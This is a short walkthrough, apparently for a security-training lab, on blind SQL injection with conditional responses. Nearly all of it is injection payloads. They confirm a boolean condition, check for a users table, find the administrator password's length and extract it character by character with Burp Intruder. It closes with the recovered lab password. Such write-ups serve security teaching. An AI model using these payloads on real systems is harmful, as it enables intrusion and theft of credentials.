# Blind SQL injection with conditional responses

## Steps:

1. First verify that appending this to the token makes the query return "welcome back"
```
' AND '1'='1
```

2. Now make sure that the wrong SQL query will not return "welcome back" message
```
' AND '1'='2
```

3. Now verify that the user table exists
```
' AND (SELECT '1' FROM users LIMIT 1)='1
```

4. Check for user called administrator
```
' AND (SELECT '1' FROM users WHERE username='administrator')='1
```

5. Check for password length
```
' AND (SELECT '1' FROM users WHERE username='administrator' AND LENGTH(password)>1)='1
```

6. Repeat until you find the length of the password
```
' AND (SELECT '1' FROM users WHERE username='administrator' AND LENGTH(password)>19)='1
```

7. This gives us the length of the password as 20

8. Next payload is
```
EwObBGHeTpbok0Sj' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
```
This can only be used in burp suite intruder. Use the intruder to send multiple requests and changing the payload. Also do a grep match to match the response

9. Building password:
```
cwnw5qx9aojomq8n3qxi
```